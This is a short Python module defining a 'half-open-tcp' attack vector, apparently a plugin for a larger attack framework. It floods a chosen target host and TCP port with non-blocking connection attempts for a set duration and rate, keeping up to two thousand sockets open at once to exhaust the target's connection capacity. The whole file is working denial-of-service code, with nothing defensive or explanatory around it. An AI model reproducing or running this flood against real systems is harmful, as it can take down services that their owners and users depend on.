import socket
import time
from _lib.ring1.base import Vector


class HalfOpenFlood(Vector):
    name = "half-open-tcp"; needs = ["ipv4"]
    def run(self, d, args):
        host = d.get("ipv4") or d.get("ipv6")
        port = d["target"].get("port")
        if not port:
            for svc in d.get("services", []):
                if svc.get("proto") == "tcp":
                    port = svc["port"]
                    break
        if not port:
            return
        socks = []
        end = time.time() + args.duration
        while time.time() < end:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try:
                s.connect_ex((host, port))
                socks.append(s)
            except Exception:
                pass
            if len(socks) > 2000:
                for old in socks[:1000]:
                    try:
                        old.close()
                    except Exception:
                        pass
                socks = socks[1000:]
            time.sleep(1.0 / max(1, args.rate))
        print(f"  half-open: {len(socks)} sockets")
